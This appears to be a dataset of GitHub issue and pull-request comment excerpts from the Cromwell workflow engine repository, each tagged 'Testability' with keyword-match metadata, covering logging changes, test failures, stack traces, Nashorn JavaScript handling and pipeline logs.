Testability,"## Liquibase logging changes. This PR started out just fixing the leaking of Liquabase messages into stdout. Before this PR, from [logs from a recent run](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577494577):. | Application | Logger | Level | Message |; |---|---|---|---|; | cromwell | slf4j | INFO | 2022-07-22 13:23:56,018 INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:57 PM liquibase.lockservice |; | cromwell | stdout | INFO | INFO: Successfully acquired change log lock |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Creating database history table with name: cromwell_test.DATABASECHANGELOG |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Reading from cromwell_test.DATABASECHANGELOG |; | centaur | slf4j | INFO | 13:24:00.375 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 13:24:00.376 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | Jul 22, 2022 1:24:00 PM liquibase.changelog |; | cromwell | stdout | WARN | WARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur |",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:13,log,logging,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532,4,"['Log', 'log']","['Logger', 'log', 'logging', 'logs']"
Testability,"### Progress update . I made a fix in liquibase and it was pulled. As a result I can now successfully create a correct cromwell database in SQLite. (At least I think so). There are some problems where SQLite has different types. (I.e. a timestamp is a text field, there is no separate TIMESTAMP column type only TEXT). This causes issues mainly in the testing, but I should be able to resolve this. There are some issues during the testing where Slick (?) or some other part does not seem to recognize foreign keys, primary keys and unique constraints, despite these being clearly there when I look at them with sqlitebrowser. This will require some more digging. As of yet running cromwell in server mode still spawns some errors when using a sqlite database, so I guess it will take some time before I have everything figured out. . Pinging @aednichols so at least someone in the Cromwell team knows this is ongoing :slightly_smiling_face: .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5490#issuecomment-654896527:352,test,testing,352,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5490#issuecomment-654896527,4,['test'],['testing']
Testability,#466 Fixed one of the tests. Updated this PR to just tag the docker test.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/467#issuecomment-187769722:22,test,tests,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/467#issuecomment-187769722,2,['test'],"['test', 'tests']"
Testability,$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: Submitted did not equal Failed; at org.scalatest.MatchersHelper$.indicateFailure(MatchersHelper.scala:346); at org.scalatest.Matchers$ShouldMethodHelper$.shouldMatcher(Matchers.scala:6668); at org.scalatest.Matchers$AnyShouldWrapper.should(Matchers.scala:6716); at cromwell.CromwellTestKitSpec.verifyWorkflowState(CromwellTestKitSpec.scala:377); at cromwell.CromwellTestKitSpec.$anonfun$runWdl$1(CromwellTestKitSpec.scala:323); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:409); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.CromwellTestKitSpec.eventually(CromwellTestKitSpec.scala:251); at cromwell.CromwellTestKitSpec.runWdl(CromwellTestKitSpec.scala:323); at cromwell.WorkflowFailSlowSpec.$anonfun$new$2(Workf,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593:5122,Test,TestFailedException,5122,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593,1,['Test'],['TestFailedException']
Testability,$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: Submitted did not equal Failed; at org.scalatest.MatchersHelper$.indicateFailure(MatchersHelper.scala:346); at org.scalatest.Matchers$ShouldMethodHelper$.shouldMatcher(Matchers.scala:6668); at org.scalatest.Matchers$AnyShouldWrapper.should(Matchers.scala:6716); at cromwell.CromwellTestKitSpec.verifyWorkflowState(CromwellTestKitSpec.scala:377); at cromwell.CromwellTestKitSpec.$anonfun$runWdl$1(CromwellTestKitSpec.scala:323); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:409); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.CromwellTestKitSpec.eventually(CromwellTestKitSpec.scala:251); at cromwell.CromwellTestKitSpec.runWdl(CromwellTestKitSpec.scala:323); at cromwell.WorkflowFailSlowSpec.$anonfun$new$4(Workf,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-467169030:5128,Test,TestFailedException,5128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-467169030,1,['Test'],['TestFailedException']
Testability,$run$1(WordSpecLike.scala:1192); at org.scalatest.SuperEngine.runImpl(Engine.scala:521); at org.scalatest.WordSpecLike.run(WordSpecLike.scala:1192); at org.scalatest.WordSpecLike.run$(WordSpecLike.scala:1190); at cromwell.CromwellTestKitWordSpec.run(CromwellTestKitSpec.scala:250); at org.scalatest.tools.Framework.org$scalatest$tools$Framework$$runSuite(Framework.scala:314); at org.scalatest.tools.Framework$ScalaTestTask.execute(Framework.scala:507); at sbt.TestRunner.runTest$1(TestFramework.scala:113); at sbt.TestRunner.run(TestFramework.scala:124); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.$anonfun$apply$1(TestFramework.scala:282); at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scala,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593:4112,Test,Tests,4112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593,2,['Test'],['Tests']
Testability,"(Specifically, this is the retry logic which supports the preemptible VM retries)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1117#issuecomment-230512806:33,log,logic,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1117#issuecomment-230512806,1,['log'],['logic']
Testability,* one must install `cwltool` to test the code and/or use CWL functionality; * show people how to use CWL parsing ; * give some pointers as to how to use coproducts,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2718#issuecomment-335918217:32,test,test,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2718#issuecomment-335918217,1,['test'],['test']
Testability,"**TL;DR Discussed in person with @ruchim. Going to 👍 , and perhaps dev choice a PR to change the syntax, using a secondary route that looks for `workflowInputs[]`.**. This current PR is very swagger spec friendly, using a fixed 2-based list of additional inputs:; - `workflowInputs`; - `workflowInputs_2`; - `workflowInputs_3`; - `workflowInputs_4`; - `workflowInputs_5`. Ideally we could use a PHP compatible syntax on a secondary spray route:; - `workflowInputs[]`; - `workflowInputs[]`; - `workflowInputs[]`; - etc. This array, using a [custom](https://groups.google.com/d/msg/spray-user/5kSZ87OnfkE/I_A_OcaIticJ) spray marshaller could be programmatically converted into an variable length `workflowInputs: Seq[String]`. Passing the sequence into the business logic would also allow storing the separated inputs in the metadata. For now the five inputs are merged into a single value in the web service and stored in the database as a merged clob. At this second I do not know if swagger would allow multiple form data elements with the same name. I'm assuming curl, HTTPie, and jvm clients such as spray-client would, as PHP supports the above syntax. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1511/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1511#issuecomment-251432342:764,log,logic,764,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1511#issuecomment-251432342,1,['log'],['logic']
Testability,"**Was the imports zip the same in each workflow?**; Yes, we were running the same workflow so the imports zip is the same. We get those import files by downloading them from github and adding them to a cache so that we don't have to download them for each workflow. **Were the workflows all the same?**; Yes, all of the workflows were the same . **Do you have any logs from the sender to check that a zip was indeed sent?**; No, we just have logs that a workflow was submitted to Cromwell 😞. **Were they submitted as a series of 999 separate submits or as a single batch submit POST?** ; They were submitted as a series of 999 individual requests in the ""On Hold"" status, and a separate process sent requests to Cromwell to started one of those on-hold workflows every 10 seconds.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4117#issuecomment-422854649:364,log,logs,364,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4117#issuecomment-422854649,2,['log'],['logs']
Testability,"*TL;DR Good news: I can fix JSON.stringify in my upcoming PR. Bad news: it breaks other JSON**. ```java; import jdk.nashorn.api.scripting.AbstractJSObject;; import jdk.nashorn.api.scripting.ClassFilter;; import jdk.nashorn.api.scripting.JSObject;; import jdk.nashorn.api.scripting.NashornScriptEngineFactory;. import javax.script.Bindings;; import javax.script.ScriptContext;; import javax.script.ScriptEngine;; import javax.script.ScriptException;; import javax.script.SimpleScriptContext;; import java.util.Collection;; import java.util.Collections;; import java.util.Map;; import java.util.Set;. /**; * Example showing that a JSObject will not cast a property key to string, plus an example showing how JSON.stringify; * returns null for Java maps. So:; * - If you need non-string key expressions ex: 'myObj[true]', then do not pass in a JSObject.; * - If you need to use JSON.stringify, then do not pass in a java.util.Map.; */; public class Main {; public static void main(String[] args) throws ScriptException {; testKeyCastImplicit();; testKeyCastExplicit();; System.out.println(""---"");; testKeyMapString();; testKeyMapNonString();; System.out.println(""---"");; testStringifyMap();; testStringifyJSObject();; testStringifyScriptObject();; }. /**; * Create and use an object in Javascript, return it to Java, and then pass it back into similar Javascript. In the; * second Javascript call we cannot use our key in the same way.; */; private static void testKeyCastImplicit() throws ScriptException {; final String expr1 = expr(; ""var obj = {};"",; ""obj[true] = 'world';"",; ""print('testKeyCastImplicit hello init ' + obj[true]);"",; ""obj;""; );; final Map<String, Object> args1 = Collections.emptyMap();; final JSObject result1 = (JSObject) eval(expr1, args1);; ; /*; JSObjectLinker does not cast keys to strings during get (and similarly in put).; - https://github.com/JetBrains/jdk8u_nashorn/blob/jdk8u76-b03/src/jdk/nashorn/internal/runtime/linker/JSObjectLinker.java#L179; - http://hg.openjdk.jav",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3090#issuecomment-355634573:1020,test,testKeyCastImplicit,1020,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3090#issuecomment-355634573,2,['test'],"['testKeyCastExplicit', 'testKeyCastImplicit']"
Testability,"+1. I think this error message should read: `No coercion defined from Array[File]? to Array[File?]`. No need to print out the value of the entire array to the logs. @katevoss:; Impact: Low (a few hours of frustrating debugging the first time a user sees it); Probability: Medium => High (if people start using conditionals more, this is going to show up for more and more people); Fix: Easy (just change the error message)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1998#issuecomment-280664016:159,log,logs,159,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1998#issuecomment-280664016,1,['log'],['logs']
Testability,", Object> args = Collections.singletonMap(""obj"", obj);; eval(expr, args);; }. /**; * Stringify a JSObject.; */; private static void testStringifyJSObject() throws ScriptException {; // JSON.stringify works fine on JSObject; final String expr = expr(; ""print('testStringifyJSObject type ' + typeof(obj));"",; ""print('testStringifyJSObject json ' + JSON.stringify(obj));""; );; final JSObject obj = new AbstractJSObject() {; // @formatter:off; final Map<String, Object> map = Collections.singletonMap(""true"", ""world"");; @Override public Object getMember(String name) { return map.get(name); }; @Override public boolean hasMember(String name) { return map.containsKey(name); }; @Override public Set<String> keySet() { return map.keySet(); }; @Override public Collection<Object> values() { return map.values(); }; // @formatter:on; };; final Map<String, Object> args = Collections.singletonMap(""obj"", obj);; eval(expr, args);; }. /**; * Stringify a ScriptObject.; */; private static void testStringifyScriptObject() throws ScriptException {; // JSON.stringify works fine on ScriptObject; final String expr = expr(; ""var obj = {};"",; ""obj[true] = 'world';"",; ""print('testStringifyScriptObject type ' + typeof(obj));"",; ""print('testStringifyScriptObject json ' + JSON.stringify(obj));""; );; final Map<String, Object> args = Collections.emptyMap();; eval(expr, args);; }. private static Object eval(final String expr, final Map<String, Object> values) throws ScriptException {; // The engine could be static, but for example purposes making a new engine/context/bindings per evaluation.; final ScriptEngine engine =; ENGINE_FACTORY.getScriptEngine(nashornStrictArgs, getNashornClassLoader(), noJavaClassFilter);; final Bindings bindings = engine.createBindings();; bindings.putAll(values);. final ScriptContext context = new SimpleScriptContext();; context.setBindings(bindings, ScriptContext.ENGINE_SCOPE);; return engine.eval(expr, context);; }. private static final NashornScriptEngineFactory ENGINE_FACTOR",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3090#issuecomment-355634573:10159,test,testStringifyScriptObject,10159,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3090#issuecomment-355634573,1,['test'],['testStringifyScriptObject']
Testability,",; ""bam"": ""gs://broad-public-datasets/NA12878/NA12878.hg38.aligned.unsorted.duplicates_marked.bam"",; ""docker"": ""us.gcr.io/broad-gatk/gatk:4.0.2.1"",; ""sortOrder"": ""queryname""; },; ""backendLabels"": {; ""wdl-task-name"": ""sortsam"",; ""wdl-call-alias"": ""presort"",; ""cromwell-workflow-id"": ""cromwell-01c7d76f-5b2b-48cd-be08-ce75b923666e""; },; ""returnCode"": 0,; ""labels"": {; ""wdl-call-alias"": ""PreSort"",; ""cromwell-workflow-id"": ""cromwell-01c7d76f-5b2b-48cd-be08-ce75b923666e"",; ""wdl-task-name"": ""SortSam""; },; ""jobId"": ""operations/EKKkveuoLBic0uPn9PDKzo4BIJ-XkZe9BioPcHJvZHVjdGlvblF1ZXVl"",; ""backend"": ""JES"",; ""end"": ""2018-04-04T00:13:06.677Z"",; ""dockerImageUsed"": ""us.gcr.io/broad-gatk/gatk@sha256:fd8e7a9e65e6a981ab3b92305492d54c3baef7a803ec3fcb895e5ebeedf824e7"",; ""stderr"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/call-PreSort/PreSort-stderr.log"",; ""callRoot"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/call-PreSort"",; ""attempt"": 1,; ""executionEvents"": [; {; ""startTime"": ""2018-04-04T00:13:04.837Z"",; ""description"": ""UpdatingCallCache"",; ""endTime"": ""2018-04-04T00:13:05.697Z""; },; {; ""startTime"": ""2018-04-03T21:35:02.588Z"",; ""description"": ""PreparingJob"",; ""endTime"": ""2018-04-03T21:35:02.606Z""; },; {; ""startTime"": ""2018-04-03T21:35:02.606Z"",; ""description"": ""CheckingCallCache"",; ""endTime"": ""2018-04-03T21:35:05.337Z""; },; {; ""startTime"": ""2018-04-03T21:52:07.621362223Z"",; ""description"": ""running-docker"",; ""endTime"": ""2018-04-03T23:46:57.248430517Z""; },; {; ""startTime"": ""2018-04-03T23:46:57.248430517Z"",; ""description"": ""delocalizing-files"",; ""endTime"": ""2018-04-04T00:10:30.287776787Z""; },; {; ""startTime"": ""2018-04-03T21:35:05.337Z"",; ""description"": ""RunningJob"",; ""endTime"": ""2018-04-03T21:35:05Z""; },; {; ""startTime"": ""2018-04-04T00:10:30.287776787Z"",; ""description"": ""ok"",; ""endTime"": ""2018-04-04T00:10:30.287776787Z""; },; {; ""startTime"": ""2018-04-03T21:35:47.186424Z"",; ""descri",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-379059328:8549,log,log,8549,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-379059328,1,['log'],['log']
Testability,"- I have a failing test case, so that's a pretty good place to start looking!; - One assumption I need to validate is that every CWL file has exactly one `Callable`:; ```; WomBundle(primaryCallable = Option(value), allCallables = Map.empty, typeAliases = Map.empty); ```; This is based on reading the CWL spec and the declaration; ```; type Cwl = Workflow :+: CommandLineTool :+: ExpressionTool :+: CNil; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4285#issuecomment-431882059:19,test,test,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4285#issuecomment-431882059,1,['test'],['test']
Testability,"- Still need to add the new config options to the README; - Something in the tests is broken, still working on that",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1127#issuecomment-230785869:77,test,tests,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1127#issuecomment-230785869,1,['test'],['tests']
Testability,- [X] ~Waiting behind #4666 for the SLURM tests~,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4654#issuecomment-465282009:42,test,tests,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4654#issuecomment-465282009,1,['test'],['tests']
Testability,"-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/variant_effect_output.txt_summary.html""; startTime: '2017-01-13T23:08:18.577755879Z'; - description: copied 0 file(s) to ""gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/VEP_Task-rc.txt""; startTime: '2017-01-13T23:12:21.761179493Z'; - description: copied 0 file(s) to ""gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/dstat.log.txt""; startTime: '2017-01-13T23:16:37.083751898Z'; - description: copied 0 file(s) to ""gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/df.log.txt""; startTime: '2017-01-13T23:20:40.785907191Z'; labels: {}; projectId: broad-firecloud-benchmark; request:; '@type': type.googleapis.com/google.genomics.v1alpha2.RunPipelineRequest; ephemeralPipeline:; docker:; cmd: /bin/bash /cromwell_root/exec.sh; imageName: broadinstitute/broadmutationcalling_beta:benchmark_1; inputParameters:; - name: __extra_config_gcs_path; - localCopy:; disk: local-disk; path: fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-GatherAndOncotate_Task/MuTect1.call_stats.vcf; name: mutectMergedRawVCF-0; - localCopy:; disk: local-disk; path: firecloud-tcga-open-access/tutorial/reference/my_dot_vep.zip; name: VEP_File-0; - localCopy:; disk: local-disk; path: exec.sh; name: exec; name: CallingGroup_Workflow; outputParameters:; - localCopy:; disk: local-disk; path: VEP_Task-rc.txt; name: VEP_Task-rc.txt; - localCopy:; disk: local-disk; path: dstat.log.txt; name: dstat.log.txt; - localCopy:; disk: local-disk; path: df.log.txt; name: df.log.txt; - localCopy:; ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145:2232,benchmark,benchmark,2232,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145,1,['benchmark'],['benchmark']
Testability,"-akka.actor.default-dispatcher-10] [WorkflowActor(akka://test-system)] WorkflowActor [UUID(299b2fc4)]: persisting status of a to Running.; [INFO] [03/03/2016 23:43:32.134] [pool-7-thread-13-ScalaTest-running-CallCachingWorkflowSpec] [akka://test-system/user/$$h] WorkflowManagerActor submitWorkflow input id = None, effective id = c21e652b-b5f0-4435-a390-b1d61d1c9b4a; ```. Next it looks like a test is started up while pointing to the same in-memory db as this paused workflow. The paused workflow is interpreted as a workflow needing restart, so another concurrent copy is launched. . ```; [INFO] [03/03/2016 23:43:32.139] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] WorkflowManagerActor Found 1 workflow to restart.; [INFO] [03/03/2016 23:43:32.139] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] WorkflowManagerActor Restarting workflow ID: 299b2fc4-6a26-462f-96e3-1281f172d197; [INFO] [03/03/2016 23:43:32.152] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] Invoking restartableWorkflow on 299b2fc4; [INFO] [03/03/2016 23:43:32.153] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] WorkflowManagerActor submitWorkflow input id = Some(299b2fc4-6a26-462f-96e3-1281f172d197), effective id = 299b2fc4-6a26-462f-96e3-1281f172d197; ```. This quickly falls afoul of a uniqueness constraint:. ```; [ERROR] [03/03/2016 23:43:32.236] [ForkJoinPool-3-worker-1] [WorkflowActor(akka://test-system)] WorkflowActor [UUID(299b2fc4)]: Could not persist runtime attributes; java.sql.SQLIntegrityConstraintViolationException: integrity constraint violation: unique constraint or index violation; UK_RUNTIME_ATTRIBUTE table: RUNTIME_ATTRIBUTES; at org.hsqldb.jdbc.JDBCUtil.sqlException(Unknown Source); at org.hsqldb.jdbc.JDBCUtil.sqlException(Unknown Source); at org.hsqldb.jdbc.JDBCPreparedStatement.fetchResult(Unknown Source); at org.hsqldb.jdbc.JDBCPreparedStatement.executeUpdate(Unknown Source); ```. From that point on it's basically a trainwreck of tests cross-talking.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-192361344:2592,test,test-system,2592,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-192361344,6,['test'],"['test-system', 'tests']"
Testability,"-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:48 I: Copying /var/log/google-genomics/*.log to; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/; 2017/02/07 15:45:48 I: Running command: sudo gsutil -h; Content-type:text/plain -q -m cp /var/log/google-genomics/*.log; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/; 2017/02/07 15:46:18 I: Copying /var/log/google-genomics/*.log to; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/; 2017/02/07 15:46:18 I: Running command: sudo gsutil -h; Content-type:text/plain -q -m cp /var/log/google-genomics/*.log; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/. ```. On Tue, Feb 7, 2017 at 2:29 PM, Jeff Gentry <notifications@github.com>; wrote:. > @LeeTL1220 <https://github.com/LeeTL1220> Where do you see these being; > retried? i.e. can you paste in the evidence that it's happening.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278113743>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk1Cgl0Kn0A875jDa1oWmlt1Ukw41ks5raMY2gaJpZM4L50dE>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 7003EB; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:15079,log,log,15079,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,3,['log'],['log']
